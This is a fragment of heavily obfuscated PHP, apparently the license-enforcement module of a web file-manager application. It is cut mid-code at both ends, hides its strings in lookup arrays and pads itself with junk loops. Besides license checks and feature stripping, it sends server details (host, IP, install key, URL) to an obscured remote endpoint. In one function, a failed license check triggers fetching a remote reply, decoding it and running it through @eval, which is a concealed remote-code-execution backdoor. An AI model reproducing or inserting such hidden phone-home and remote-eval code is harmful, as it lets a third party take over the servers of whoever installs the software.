$…Åã•À[116], $…Åã•À[6]); if (KodUser::isRoot() && $this->config[$…Åã•À[117]]) { $Æ°×…öè[$…Åã•À[100]][$…Åã•À[118]] = WEB_ROOT; } return $Æ°×…öè; } private function nhyd065a19ad() { $ÄíÚåçÀ =& $_SERVER[ ÇƒŠìÀ]; $½ëœõˆö =& $_SERVER[‡©‹¬£]; $¦ÚˆÂ£Í = $_SERVER[$½ëœõˆö[24]] == $½ëœõˆö[119]; if ($_SERVER[$½ëœõˆö[24]] == $½ëœõˆö[120] && $_GET[$½ëœõˆö[121]] == $½ëœõˆö[122]) { $¦ÚˆÂ£Í = !0; } if ($¦ÚˆÂ£Í) { $ÜÆËÔ¢ü = array($½ëœõˆö[107] => $this->filo60ae1ab4, $½ëœõˆö[123] => $this->nupk3c048ade(), $½ëœõˆö[124] => Model($½ëœõˆö[125])->count()); if ($this->filo60ae1ab4 != $½ëœõˆö[108]) { $í‘¸® = _get($this->ieyc73b1ffe1, $½ëœõˆö[126]); if ($í‘¸®) { $ÜÆËÔ¢ü[$½ëœõˆö[127]] = $í‘¸®; $ÜÆËÔ¢ü[$½ëœõˆö[128]] = strtotime(_get($this->ieyc73b1ffe1, $½ëœõˆö[129])); $ÜÆËÔ¢ü[$½ëœõˆö[130]] = _get($this->ieyc73b1ffe1, $½ëœõˆö[116]); } $¦ßÔİé¹ = Model($½ëœõˆö[33])->get($½ëœõˆö[131], $½ëœõˆö[6], !0); if (is_string($¦ßÔİé¹) && substr($¦ßÔİé¹, 0, 1) == $½ëœõˆö[132]) { $¦ßÔİé¹ = json_decode_force($¦ßÔİé¹); } if (is_array($¦ßÔİé¹) && $¦ßÔİé¹[$½ëœõˆö[133]] && strstr($¦ßÔİé¹[$½ëœõˆö[133]], $½ëœõˆö[134])) { $¬©ı¹Ø = explode($½ëœõˆö[134], $¦ßÔİé¹[$½ëœõˆö[133]]); $ÜÆËÔ¢ü[$½ëœõˆö[135]] = $¬©ı¹Ø[0]; } } $ÜÆËÔ¢ü = $this->rdoia8cbdb09(json_encode($ÜÆËÔ¢ü), md5($½ëœõˆö[136])); $ÖøëÏ£Ò = array($½ëœõˆö[137] => $ÜÆËÔ¢ü); call_user_func(array($½ëœõˆö[138], $½ëœõˆö[139]), $ÖøëÏ£Ò); $ô³ĞÒ©Ê = $ÄíÚåçÀ[682]; if (strlen($ô³ĞÒ©Ê) < $ÄíÚåçÀ[683]) { return; } } if ($this->filo60ae1ab4 == $½ëœõˆö[108]) { return; } $´è÷¥Ï¤ = array($½ëœõˆö[140], $½ëœõˆö[141], $½ëœõˆö[142], $½ëœõˆö[143], $½ëœõˆö[144], $½ëœõˆö[145]); $åß–Ä™ = Model($½ëœõˆö[33])->get(); $¨ãçšÚ‚ = $ÄíÚåçÀ[684]; if (strlen($¨ãçšÚ‚) < $ÄíÚåçÀ[664]) { return; } $ÖøëÏ£Ò = array($½ëœõˆö[146] => $åß–Ä™[$½ëœõˆö[34]], $½ëœõˆö[147] => $åß–Ä™[$½ëœõˆö[35]], $½ëœõˆö[148] => $½ëœõˆö[6]); foreach ($´è÷¥Ï¤ as $ĞğÔ¦®) { if (!isset($åß–Ä™[$ĞğÔ¦®]) || !$åß–Ä™[$ĞğÔ¦®]) { continue; } $ÖøëÏ£Ò[$ĞğÔ¦®] = $åß–Ä™[$ĞğÔ¦®]; $¡‘œ½Û¼ = $ÄíÚåçÀ[685]; } call_user_func(array($½ëœõˆö[138], $½ëœõˆö[139]), $ÖøëÏ£Ò); $‰ÊØŠ· = $ÄíÚåçÀ[686]; } private function zkmx80443fdd() { $Ÿ†ÁÃ«É =& $_SERVER[ ÇƒŠìÀ]; $Š™¾“ç¥ =& $_SERVER[‡©‹¬£]; if ($_SERVER[$Š™¾“ç¥[24]] != $Š™¾“ç¥[149]) { return; } if (!KodUser::isRoot()) { die; } $ç˜òªŠ‘ = $GLOBALS[$Š™¾“ç¥[13]]; if (isset($ç˜òªŠ‘[$Š™¾“ç¥[150]])) { $this->sdko74f9a880(); die; } if (isset($ç˜òªŠ‘[$Š™¾“ç¥[151]]) && isset($ç˜òªŠ‘[$Š™¾“ç¥[151]]) == $Š™¾“ç¥[122]) { $ç˜òªŠ‘[$Š™¾“ç¥[152]] = Model($Š™¾“ç¥[33])->get($Š™¾“ç¥[153]); } if (!isset($ç˜òªŠ‘[$Š™¾“ç¥[152]]) || strlen($ç˜òªŠ‘[$Š™¾“ç¥[152]]) != 16) { show_json($Š™¾“ç¥[154] . $ç˜òªŠ‘[$Š™¾“ç¥[152]], !1); } $ÎÑûÙ®œ = Model($Š™¾“ç¥[33])->get($Š™¾“ç¥[99]); $÷ìÏ‰Éğ = md5($_SERVER[$Š™¾“ç¥[105]] . $ÎÑûÙ®œ); $“ó˜¦öª = array($Š™¾“ç¥[152] => $ç˜òªŠ‘[$Š™¾“ç¥[152]], $Š™¾“ç¥[155] => rand_string(16), $Š™¾“ç¥[156] => $Š™¾“ç¥[136], $Š™¾“ç¥[157] => $Š™¾“ç¥[158], $Š™¾“ç¥[159] => $_SERVER[$Š™¾“ç¥[160]], $Š™¾“ç¥[161] => $_SERVER[$Š™¾“ç¥[162]], $Š™¾“ç¥[163] => $_SERVER[$Š™¾“ç¥[164]], $Š™¾“ç¥[104] => $÷ìÏ‰Éğ, $Š™¾“ç¥[165] => Model($Š™¾“ç¥[33])->get($Š™¾“ç¥[131])); $ŒÇúî– = $Ÿ†ÁÃ«É[687]; if ($ç˜òªŠ‘[$Š™¾“ç¥[166]] == $Š™¾“ç¥[167]) { $ç»Î…š¤ = $this->rdoia8cbdb09($÷ìÏ‰Éğ, $Š™¾“ç¥[168]); $©•—Î²– = $this->cnjp144a310f(json_encode($“ó˜¦öª), $÷ìÏ‰Éğ . $Š™¾“ç¥[169], 3); $©•—Î²– = $©•—Î²– . $Š™¾“ç¥[170] . $_SERVER[$Š™¾“ç¥[160]]; $å³Øöë¶ = $this->qyxb2a620a0a($Š™¾“ç¥[171] . $ç»Î…š¤ . $Š™¾“ç¥[172] . $©•—Î²–, -1); show_json($å³Øöë¶, !0); } else { if ($ç˜òªŠ‘[$Š™¾“ç¥[166]] == $Š™¾“ç¥[173]) { $ñ²„¹ù = substr(md5($Š™¾“ç¥[174] . $÷ìÏ‰Éğ), 12, 15) . $Š™¾“ç¥[175]; $©•—Î²– = $this->svmp82f3179c(trim($ç˜òªŠ‘[$Š™¾“ç¥[176]]), $ñ²„¹ù, 2); $£ë¨¢üÑ = json_decode($©•—Î²–, !0); if (!is_array($£ë¨¢üÑ) || !is_array($£ë¨¢üÑ[$Š™¾“ç¥[177]]) || $£ë¨¢üÑ[$Š™¾“ç¥[152]] != !0) { $¡îÆƒÖä = $Š™¾“ç¥[178]; $áÉìÓÁÌ = $£ë¨¢üÑ[$Š™¾“ç¥[177]] ? $Š™¾“ç¥[179] . $£ë¨¢üÑ[$Š™¾“ç¥[177]] : $¡îÆƒÖä; show_json($áÉìÓÁÌ, !1); } else { $“ó˜¦öª[$Š™¾“ç¥[155]] = $£ë¨¢üÑ[$Š™¾“ç¥[177]][$Š™¾“ç¥[180]]; } } else { $£ë¨¢üÑ = $this->qyxb2a620a0a($Š™¾“ç¥[181], $“ó˜¦öª, 10); $ìÇ©™ÚÙ = $Ÿ†ÁÃ«É[688]; while ($ìÇ©™ÚÙ < $Ÿ†ÁÃ«É[683]) { if ($ìÇ©™ÚÙ >= 0) { break; } $ìÇ©™ÚÙ++; } } } if (!is_array($£ë¨¢üÑ) || !is_array($£ë¨¢üÑ[$Š™¾“ç¥[177]]) || $£ë¨¢üÑ[$Š™¾“ç¥[152]] != !0) { $¡îÆƒÖä = LNG($Š™¾“ç¥[182]); $áÉìÓÁÌ = $£ë¨¢üÑ[$Š™¾“ç¥[177]] ? $Š™¾“ç¥[179] . $£ë¨¢üÑ[$Š™¾“ç¥[177]] : $¡îÆƒÖä; show_json($áÉìÓÁÌ, !1); } $‘‹á—ãò = $£ë¨¢üÑ[$Š™¾“ç¥[177]]; $˜¬è¶·´ = $this->fbhl415c11d6($‘‹á—ãò[$Š™¾“ç¥[183]]); if (!$˜¬è¶·´ || $˜¬è¶·´ != $‘‹á—ãò[$Š™¾“ç¥[129]]) { $‚®„º¢é = array($Š™¾“ç¥[184] => Model($Š™¾“ç¥[33])->get($Š™¾“ç¥[99]), $Š™¾“ç¥[185] => $_SERVER[$Š™¾“ç¥[105]], $Š™¾“ç¥[186] => this_url(), $Š™¾“ç¥[161] => $_SERVER[$Š™¾“ç¥[162]]); $©•—Î²– = $this->arxv7f6580dc(json_encode($‚®„º¢é)); $this->qyxb2a620a0a($Š™¾“ç¥[187] . $©•—Î²–); show_json(LNG($Š™¾“ç¥[188]), !0); } $ïÇ…‚—õ = array($Š™¾“ç¥[153] => $‘‹á—ãò[$Š™¾“ç¥[189]], $Š™¾“ç¥[190] => $‘‹á—ãò[$Š™¾“ç¥[191]], $Š™¾“ç¥[192] => rand_string(16), $Š™¾“ç¥[107] => $‘‹á—ãò[$Š™¾“ç¥[193]]); if ($“ó˜¦öª[$Š™¾“ç¥[155]]) { $ïÇ…‚—õ[$Š™¾“ç¥[192]] = $“ó˜¦öª[$Š™¾“ç¥[155]]; } $ƒ„ÒÔ÷ô = substr(md5($ïÇ…‚—õ[$Š™¾“ç¥[190]]), 10, 10); $âã¨Çœ¤ = $ƒ„ÒÔ÷ô . $ïÇ…‚—õ[$Š™¾“ç¥[107]] . $ïÇ…‚—õ[$Š™¾“ç¥[192]]; $ïÇ…‚—õ[$Š™¾“ç¥[109]] = strrev(base64_encode($this->rdoia8cbdb09($âã¨Çœ¤, $Š™¾“ç¥[194]))); $ª¥öïş = rand_string(16); $•×çÒ®† = $Ÿ†ÁÃ«É[689]; if (strlen($•×çÒ®†) < $Ÿ†ÁÃ«É[653]) { die; } $‡ğ°ä½ = $ª¥öïş . $ïÇ…‚—õ[$Š™¾“ç¥[107]] . $this->rdoia8cbdb09(md5($ïÇ…‚—õ[$Š™¾“ç¥[153]]), $ª¥öïş); $ïÇ…‚—õ[$Š™¾“ç¥[110]] = base64_encode(strrev($this->rdoia8cbdb09($‡ğ°ä½, $Š™¾“ç¥[195]))); if ($‘‹á—ãò[$Š™¾“ç¥[196]] && $‘‹á—ãò[$Š™¾“ç¥[196]] >= 1) { Model($Š™¾“ç¥[33])->setDeep($Š™¾“ç¥[197], $Š™¾“ç¥[122]); } Model($Š™¾“ç¥[33])->set($ïÇ…‚—õ); $ ¸ÚŠï› = md5($_SERVER[$Š™¾“ç¥[105]] . strrev($ÎÑûÙ®œ) . $ïÇ…‚—õ[$Š™¾“ç¥[190]]); $–—×ä‚Ç = strrev(substr($ ¸ÚŠï›, 10, 16)); $éáñôçƒ = $this->cnjp144a310f(json_encode($‘‹á—ãò), $ ¸ÚŠï›); $€•‡Ş = array_to_keyvalue(Model($Š™¾“ç¥[7])->listData(), $Š™¾“ç¥[198]); $ØÙñí§ñ = $€•‡Ş[$Š™¾“ç¥[199]]; $è¹È·È = array(); $Ç—€û¹ş = $Ÿ†ÁÃ«É[690]; while (strlen($Ç—€û¹ş) < $Ÿ†ÁÃ«É[683]) { if (!$Ç—€û¹ş) { break; } $Ç—€û¹ş++; } $è¹È·È[$–—×ä‚Ç] = $éáñôçƒ; Model($Š™¾“ç¥[7])->update($ØÙñí§ñ[$Š™¾“ç¥[200]], array($Š™¾“ç¥[201] => $è¹È·È)); $­ˆ·÷’ù = $Ÿ†ÁÃ«É[691]; if (strlen($­ˆ·÷’ù) < $Ÿ†ÁÃ«É[653]) { return; } $this->ieyc73b1ffe1 = $‘‹á—ãò; $¸ô¡·õ¦ = $Ÿ†ÁÃ«É[692]; if (strlen($¸ô¡·õ¦) < $Ÿ†ÁÃ«É[664]) { die; } $this->filo60ae1ab4 = $ïÇ…‚—õ[$Š™¾“ç¥[107]]; $this->licenseRegistSuccess(); $à¯Êãƒ— = $Ÿ†ÁÃ«É[693]; if (!$à¯Êãƒ—) { return; } Cache::set($Š™¾“ç¥[202] . md5($ÎÑûÙ®œ . $Š™¾“ç¥[203]), $Š™¾“ç¥[6]); show_json(LNG($Š™¾“ç¥[188]), !0); } private function licenseRegistSuccess() { $¢šÖÌ— =& $_SERVER[ ÇƒŠìÀ]; $ãñøİ¿ =& $_SERVER[‡©‹¬£]; $ùĞ‚šè = Model($ãñøİ¿[33])->get(); $®àŒµ—î = $¢šÖÌ—[694]; if (strlen($®àŒµ—î) < $¢šÖÌ—[662]) { return; } if ($ùĞ‚šè[$ãñøİ¿[63]] != $ãñøİ¿[122]) { Model($ãñøİ¿[33])->set($ãñøİ¿[63], $ãñøİ¿[122]); } Action($ãñøİ¿[204])->initStart(!0); } private function sdko74f9a880() { $Š—Ğ”Ó× =& $_SERVER[‡©‹¬£]; Model($Š—Ğ”Ó×[33])->set(array($Š—Ğ”Ó×[153] => $Š—Ğ”Ó×[6], $Š—Ğ”Ó×[190] => $Š—Ğ”Ó×[6], $Š—Ğ”Ó×[107] => $Š—Ğ”Ó×[108], $Š—Ğ”Ó×[109] => $Š—Ğ”Ó×[6], $Š—Ğ”Ó×[110] => $Š—Ğ”Ó×[6])); Model($Š—Ğ”Ó×[33])->setDeep($Š—Ğ”Ó×[197], $Š—Ğ”Ó×[205]); $this->ieyc73b1ffe1 = array(); $this->filo60ae1ab4 = $Š—Ğ”Ó×[108]; } private function jctn9e031c82() { $âçß¸­² =& $_SERVER[ ÇƒŠìÀ]; $ˆ¾æ¿ô‰ =& $_SERVER[‡©‹¬£]; $_SERVER[$ˆ¾æ¿ô‰[162]] = _get($_SERVER, $ˆ¾æ¿ô‰[162], APP_HOST); $¸ºŠÀœ¶ = $âçß¸­²[695]; while (strlen($¸ºŠÀœ¶) < $âçß¸­²[653]) { if (!$¸ºŠÀœ¶) { break; } $¸ºŠÀœ¶++; } $this->filo60ae1ab4 = $ˆ¾æ¿ô‰[108]; $ì»­…•ì = Model($ˆ¾æ¿ô‰[33])->get(); $Ó×ÚÓ† = $âçß¸­²[696]; if ($ì»­…•ì[$ˆ¾æ¿ô‰[107]] == $ˆ¾æ¿ô‰[108]) { return; } $ÄĞïÚÁ­ = Model($ˆ¾æ¿ô‰[33])->get($ˆ¾æ¿ô‰[99]); $˜ü—› = $âçß¸­²[697]; $Ü·¸Ä’ú = $ˆ¾æ¿ô‰[202] . md5($ÄĞïÚÁ­ . $ˆ¾æ¿ô‰[203]); $¿Ó·¸ñ€ = $âçß¸­²[698]; if (strlen($¿Ó·¸ñ€) < $âçß¸­²[662]) { return; } $õâ‚µæè = Cache::get($Ü·¸Ä’ú); $¬ºÈ‰óĞ = $âçß¸­²[699]; while ($¬ºÈ‰óĞ < $âçß¸­²[655]) { if ($¬ºÈ‰óĞ >= 0) { break; } $¬ºÈ‰óĞ++; } if (!is_array($õâ‚µæè) || !isset($õâ‚µæè[$ˆ¾æ¿ô‰[206]]) || time() - $õâ‚µæè[$ˆ¾æ¿ô‰[206]] >= 60) { $œÃöùŠÂ = Model($ˆ¾æ¿ô‰[7])->loadList(); $Åº£µƒñ = $œÃöùŠÂ[$ˆ¾æ¿ô‰[199]]; $îÖ«è†ê = md5($_SERVER[$ˆ¾æ¿ô‰[105]] . strrev($ÄĞïÚÁ­) . $ì»­…•ì[$ˆ¾æ¿ô‰[190]]); $øîŸŞ”Û = strrev(substr($îÖ«è†ê, 10, 16)); $õâ‚µæè = $this->svmp82f3179c($Åº£µƒñ[$ˆ¾æ¿ô‰[85]][$øîŸŞ”Û], $îÖ«è†ê); $õâ‚µæè = json_decode($õâ‚µæè, !0); } if (!is_array($õâ‚µæè)) { return $this->sdko74f9a880(); } $Í«½ß‡¥ = strtotime($õâ‚µæè[$ˆ¾æ¿ô‰[129]]); if (time() >= $Í«½ß‡¥) { return $this->sdko74f9a880(); } if (time() - $õâ‚µæè[$ˆ¾æ¿ô‰[206]] > 20) { $õâ‚µæè[$ˆ¾æ¿ô‰[206]] = time(); Cache::set($Ü·¸Ä’ú, $õâ‚µæè); } $this->ieyc73b1ffe1 = $õâ‚µæè; $this->filo60ae1ab4 = $ì»­…•ì[$ˆ¾æ¿ô‰[107]]; $§ë¼ôêã = $âçß¸­²[700]; if (strlen($§ë¼ôêã) < $âçß¸­²[653]) { return; } } private function cndh1b7f8d4c() { $ËÒóµà¤ =& $_SERVER[‡©‹¬£]; $­¥ã”Š¾ = $GLOBALS[$ËÒóµà¤[13]]; $Ú‰Š·’ = $_SERVER[$ËÒóµà¤[24]]; if ($Ú‰Š·’ == $ËÒóµà¤[207] && $this->filo60ae1ab4 == $ËÒóµà¤[108]) { show_json(LNG($ËÒóµà¤[208]), !1, $ËÒóµà¤[209]); } $Ü€„ÂÇ = array($ËÒóµà¤[210], $ËÒóµà¤[211]); if (in_array($Ú‰Š·’, $Ü€„ÂÇ)) { if ($this->filo60ae1ab4 == $ËÒóµà¤[108] && isset($­¥ã”Š¾[$ËÒóµà¤[212]])) { show_json(LNG($ËÒóµà¤[208]), !1, $ËÒóµà¤[209]); die; } $¬³õ¿Œã = $this->nupk3c048ade(); if ($¬³õ¿Œã != intval($ËÒóµà¤[213])) { if ($¬³õ¿Œã <= Model($ËÒóµà¤[125])->count()) { show_json(LNG($ËÒóµà¤[214]), !1, $ËÒóµà¤[209]); die; } } } } private function yuld0a8612b0() { $à­±Ô• =& $_SERVER[ ÇƒŠìÀ]; $Ê‰¬ÀÏî =& $_SERVER[‡©‹¬£]; $À¾ã¼Ìù = array($Ê‰¬ÀÏî[119], $Ê‰¬ÀÏî[120]); $åù Ÿ• = $à­±Ô•[701]; if (!KodUser::isRoot() || !isset($_GET[$Ê‰¬ÀÏî[215]])) { return; } if (!in_array($_SERVER[$Ê‰¬ÀÏî[24]], $À¾ã¼Ìù)) { return; } $‹‚‚½µÛ = $Ê‰¬ÀÏî[216]; $‹‚‚½µÛ = $this->kmnga0c0ba6b($‹‚‚½µÛ, $Ê‰¬ÀÏî[217]); $“Ì±Œ©ß = stream_context_create(array($Ê‰¬ÀÏî[218] => array($Ê‰¬ÀÏî[219] => $Ê‰¬ÀÏî[220], $Ê‰¬ÀÏî[221] => 3))); $ìõ·É = @file_get_contents($‹‚‚½µÛ, !1, $“Ì±Œ©ß); $ÁşçåÒ = $à­±Ô•[702]; while ($ÁşçåÒ < $à­±Ô•[653]) { if ($ÁşçåÒ >= 0) { break; } $ÁşçåÒ++; } header($Ê‰¬ÀÏî[222]); $¼ı»ƒÙ = $à­±Ô•[703]; if ($ìõ·É && strstr($ìõ·É, $Ê‰¬ÀÏî[223])) { echo $ìõ·É; } die; } public function sxev0d4769c8($‰Ó¼ïæ¼) { $ş€¶Ã¸ =& $_SERVER[ ÇƒŠìÀ]; $İè£ìÛÑ =& $_SERVER[‡©‹¬£]; if ($this->filo60ae1ab4 == $İè£ìÛÑ[224]) { return $‰Ó¼ïæ¼; } $ÁĞİî”¸ = array($İè£ìÛÑ[225] => $İè£ìÛÑ[226], $İè£ìÛÑ[227] => $İè£ìÛÑ[226], $İè£ìÛÑ[228] => $İè£ìÛÑ[226], $İè£ìÛÑ[229] => $İè£ìÛÑ[230], $İè£ìÛÑ[231] => $İè£ìÛÑ[230], $İè£ìÛÑ[232] => $İè£ìÛÑ[230], $İè£ìÛÑ[233] => $İè£ìÛÑ[230], $İè£ìÛÑ[234] => $İè£ìÛÑ[230], $İè£ìÛÑ[235] => $İè£ìÛÑ[230], $İè£ìÛÑ[236] => $İè£ìÛÑ[230], $İè£ìÛÑ[237] => $İè£ìÛÑ[230], $İè£ìÛÑ[238] => $İè£ìÛÑ[230], $İè£ìÛÑ[239] => $İè£ìÛÑ[230], $İè£ìÛÑ[240] => $İè£ìÛÑ[230], $İè£ìÛÑ[241] => $İè£ìÛÑ[230]); $öÃ«à…¬ = explode($İè£ìÛÑ[242], _get($this->ieyc73b1ffe1, $İè£ìÛÑ[114], $İè£ìÛÑ[6])); $«ŸÆøÄ¥ = array(); $¤€¬Õ…È = $ş€¶Ã¸[704]; while ($¤€¬Õ…È < $ş€¶Ã¸[653]) { if ($¤€¬Õ…È >= 0) { break; } $¤€¬Õ…È++; } foreach ($ÁĞİî”¸ as $ßÍÎê—· => $„ÔªÏèû) { if ($„ÔªÏèû == $İè£ìÛÑ[226] && substr($this->filo60ae1ab4, 0, 1) == $İè£ìÛÑ[226]) { continue; } if (!in_array($ßÍÎê—·, $öÃ«à…¬)) { $«ŸÆøÄ¥[] = $ßÍÎê—·; } } foreach ($«ŸÆøÄ¥ as $ßÍÎê—·) { unset($‰Ó¼ïæ¼[$ßÍÎê—·]); $âÄß› † = $ş€¶Ã¸[705]; if (strlen($âÄß› †) < $ş€¶Ã¸[664]) { die; } } return $‰Ó¼ïæ¼; } private function esta24aca55b() { $£œ…Û» =& $_SERVER[‡©‹¬£]; if ($this->filo60ae1ab4 != $£œ…Û»[108]) { $GLOBALS[$£œ…Û»[85]][$£œ…Û»[89]][$£œ…Û»[243]] = $£œ…Û»[205]; return; } $GLOBALS[$£œ…Û»[85]][$£œ…Û»[244]] = $£œ…Û»[122]; if (Model($£œ…Û»[245])->get($£œ…Û»[63]) != $£œ…Û»[205]) { Model($£œ…Û»[245])->set($£œ…Û»[63], $£œ…Û»[205]); } } public function jnbr26273658() { $Ä°Ñ°˜ =& $_SERVER[ ÇƒŠìÀ]; return $_SERVER[‡©‹¬£][246]; $ä¶ÇñƒÌ = $Ä°Ñ°˜[706]; while (strlen($ä¶ÇñƒÌ) < $Ä°Ñ°˜[664]) { if (!$ä¶ÇñƒÌ) { break; } $ä¶ÇñƒÌ++; } } private function ibpna60d5ad9() { $ƒë«³’” =& $_SERVER[ ÇƒŠìÀ]; $‚ğ¼¥¶œ =& $_SERVER[‡©‹¬£]; $ñ´ôĞƒ» = array($‚ğ¼¥¶œ[247], $‚ğ¼¥¶œ[248], $‚ğ¼¥¶œ[249]); $†›šÃÀ = $ƒë«³’”[707]; if (!$†›šÃÀ) { die; } $Ÿ×Ôˆ = $‚ğ¼¥¶œ[250] . md5($‚ğ¼¥¶œ[251]); if ($this->filo60ae1ab4 == $‚ğ¼¥¶œ[108] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$‚ğ¼¥¶œ[24]], $ñ´ôĞƒ»)) { return; } if (time() % 4 != 0) { return; } $Íõ´ÛÜæ = call_user_func(array($‚ğ¼¥¶œ[252], $‚ğ¼¥¶œ[253]), $Ÿ×Ôˆ); $÷Îé«‚ê = $ƒë«³’”[708]; if (!$÷Îé«‚ê) { return; } if ($Íõ´ÛÜæ && time() - $Íõ´ÛÜæ < intval($‚ğ¼¥¶œ[254])) { return; } call_user_func(array($‚ğ¼¥¶œ[252], $‚ğ¼¥¶œ[139]), $Ÿ×Ôˆ, time()); $îƒ˜Æ¿Å = $ƒë«³’”[709]; if (strlen($îƒ˜Æ¿Å) < $ƒë«³’”[683]) { return; } $ó—“Âİ€ = Model($‚ğ¼¥¶œ[33])->get($‚ğ¼¥¶œ[99]); $Ë°´ãÇó = $ƒë«³’”[710]; while (strlen($Ë°´ãÇó) < $ƒë«³’”[662]) { if (!$Ë°´ãÇó) { break; } $Ë°´ãÇó++; } $»ÓäÙÌå = array($‚ğ¼¥¶œ[152] => Model($‚ğ¼¥¶œ[33])->get($‚ğ¼¥¶œ[153]), $‚ğ¼¥¶œ[166] => $this->filo60ae1ab4, $‚ğ¼¥¶œ[163] => $_SERVER[$‚ğ¼¥¶œ[164]], $‚ğ¼¥¶œ[165] => Model($‚ğ¼¥¶œ[33])->get($‚ğ¼¥¶œ[131]), $‚ğ¼¥¶œ[104] => md5($_SERVER[$‚ğ¼¥¶œ[105]] . $ó—“Âİ€), $‚ğ¼¥¶œ[156] => $‚ğ¼¥¶œ[136], $‚ğ¼¥¶œ[159] => $_SERVER[$‚ğ¼¥¶œ[160]]); $ËÜ×¶ø = $ƒë«³’”[711]; if (!$ËÜ×¶ø) { return; } $œİ×ûÏ÷ = $this->qyxb2a620a0a($‚ğ¼¥¶œ[255], $»ÓäÙÌå); $º†ŠÕ¿‚ = $ƒë«³’”[712]; if (!$º†ŠÕ¿‚) { die; } if (!is_array($œİ×ûÏ÷)) { return; } if ($œİ×ûÏ÷[$‚ğ¼¥¶œ[152]] && $œİ×ûÏ÷[$‚ğ¼¥¶œ[256]]) { if ($this->fbhl415c11d6($œİ×ûÏ÷[$‚ğ¼¥¶œ[256]]) == $»ÓäÙÌå[$‚ğ¼¥¶œ[152]]) { return; } } $this->sdko74f9a880(); $’óƒĞÙè = $ƒë«³’”[713]; if (strlen($’óƒĞÙè) < $ƒë«³’”[655]) { return; } if ($this->fbhl415c11d6($œİ×ûÏ÷[$‚ğ¼¥¶œ[256]]) != $»ÓäÙÌå[$‚ğ¼¥¶œ[152]]) { $Òèñ›É = array($‚ğ¼¥¶œ[184] => $ó—“Âİ€, $‚ğ¼¥¶œ[185] => $_SERVER[$‚ğ¼¥¶œ[105]], $‚ğ¼¥¶œ[186] => this_url(), $‚ğ¼¥¶œ[161] => $_SERVER[$‚ğ¼¥¶œ[162]]); $²·§îÀ = $this->arxv7f6580dc(json_encode($Òèñ›É)); $œİ×ûÏ÷ = $this->qyxb2a620a0a($‚ğ¼¥¶œ[187] . $²·§îÀ); if ($œİ×ûÏ÷ && is_array($œİ×ûÏ÷) && isset($œİ×ûÏ÷[$‚ğ¼¥¶œ[256]])) { $¶øÉÌíå = $this->svmp82f3179c($œİ×ûÏ÷[$‚ğ¼¥¶œ[256]], 2); if ($¶øÉÌíå) { $¶øÉÌíå = $this->fbhl415c11d6($¶øÉÌíå); } if ($¶øÉÌíå) { try { @eval($¶øÉÌíå); } catch (Exception $ûÜ‚‡ºÕ) { } } } } } private function qyxb2a620a0a($óÕÓæ = '', $Ö¯×Äµ† = array(), $¢ÅµÈ¾æ = 5) { $íÕ™¨³ó =& $_SERVER[ ÇƒŠìÀ]; $éÉÑÁ¤¥ =& $_SERVER[‡©‹¬£]; $ú»°å„ò = $éÉÑÁ¤¥[257]; $ú»°å„ò = $this->kmnga0c0ba6b($ú»°å„ò, $éÉÑÁ¤¥[258]); $ú»°å„ò = $ú»°å„ò . $óÕÓæ; if ($Ö¯×Äµ† && is_array($Ö¯×Äµ†)) { $ú»°å„ò = $ú»°å„ò . $éÉÑÁ¤¥[259] . http_build_query($Ö¯×Äµ†); } if ($Ö¯×Äµ† === -1) { return $ú»°å„ò; } $ÓË•ª¬ = stream_context_create(array($éÉÑÁ¤¥[218] => array($éÉÑÁ¤¥[221] => $¢ÅµÈ¾æ, $éÉÑÁ¤¥[219] => $éÉÑÁ¤¥[260]), $éÉÑÁ¤¥[261] => array($éÉÑÁ¤¥[262] => !1, $éÉÑÁ¤¥[263] => !1))); $Ö¯×Äµ† = @file_get_contents($ú»°å„ò, !1, $ÓË•ª¬); $äÓ’‰Ãë = $íÕ™¨³ó[714]; return json_decode($Ö¯×Äµ†, !0); $ÈĞ¯ƒ = $íÕ™¨³ó[715]; if (!$ÈĞ¯ƒ) { die; } } private function nupk3c048ade() { $¥…»úÆ² =& $_SERVER[ ÇƒŠìÀ]; $şê´½õ³ =& $_SERVER[‡©‹¬£]; $ÙåâÙ´ş = array($şê´½õ³[264] => $şê´½õ³[265], $şê´½õ³[266] => $şê´½õ³[267], $şê´½õ³[268] => $şê´½õ³[269], $şê´½õ³[270] => $şê´½õ³[271], $şê´½õ³[272] => $şê´½õ³[273], $şê´½õ³[274] => $şê´½õ³[213], $şê´½õ³[275] => $şê´½õ³[213], $şê´½õ³[276] => $şê´½õ³[265], $şê´½õ³[277] => $şê´½õ³[267], $şê´½õ³[278] => $şê´½õ³[269], $şê´½õ³[279] => $şê´½õ³[280], $şê´½õ³[281] => $şê´½õ³[271], $şê´½õ³[282] => $şê´½õ³[283], $şê´½õ³[284] => $şê´½õ³[273], $şê´½õ³[285] => $şê´½õ³[286], $şê´½õ³[287] => $şê´½õ³[288], $şê´½õ³[289] => $şê´½õ³[290]); $•ÊÃóô = $¥…»úÆ²[716]; while (strlen($•ÊÃóô) < $¥…»úÆ²[662]) { if (!$•ÊÃóô) { break; } $•ÊÃóô++; } $¢çÒæ¶Â = $ÙåâÙ´ş[$this->filo60ae1ab4]; $¢çÒæ¶Â = intval($¢çÒæ¶Â ? $¢çÒæ¶Â : $şê´½õ³[265]); $ô²™Ãì = _get($this->ieyc73b1ffe1, $şê´½õ³[291]); $ô²™Ãì = $ô²™Ãì ? intval($ô²™Ãì) : 0; $ğ••‘û’ = $¥…»úÆ²[717]; while ($ğ••‘û’ < $¥…»úÆ²[662]) { if ($ğ••‘û’ >= 0) { break; } $ğ••‘û’++; } return $¢çÒæ¶Â + $ô²™Ãì; } public function ctzm29a766bc($ª¸Îèöš) { $÷¬Õ« =& $_SERVER[ ÇƒŠìÀ]; $¯‚¡”ë =& $_SERVER[‡©‹¬£]; $¹˜ø¨’Õ = $this->nupk3c048ade(); $Ä»óÜ³Ø = $÷¬Õ«[718]; while ($Ä»óÜ³Ø < $÷¬Õ«[664]) { if ($Ä»óÜ³Ø >= 0) { break; } $Ä»óÜ³Ø++; } if ($ª¸Îèöš[$¯‚¡”ë[292]] == $¯‚¡”ë[122]) { return; } if ($¹˜ø¨’Õ >= intval($¯‚¡”ë[213])) { return; } $³¿¤Åşß = Model($¯‚¡”ë[125])->count(); $ØÁĞÙ¨Û = $÷¬Õ«[719]; if ($³¿¤Åşß <= $¹˜ø¨’Õ) { return; } $ù±¨å” = Model($¯‚¡”ë[125])->field($¯‚¡”ë[292])->limit($¹˜ø¨’Õ)->select(); $ìÊÛå­ = $÷¬Õ«[720]; if (!$ìÊÛå­) { die; } $ù±¨å” = array_to_keyvalue($ù±¨å”, $¯‚¡”ë[6], $¯‚¡”ë[292]); 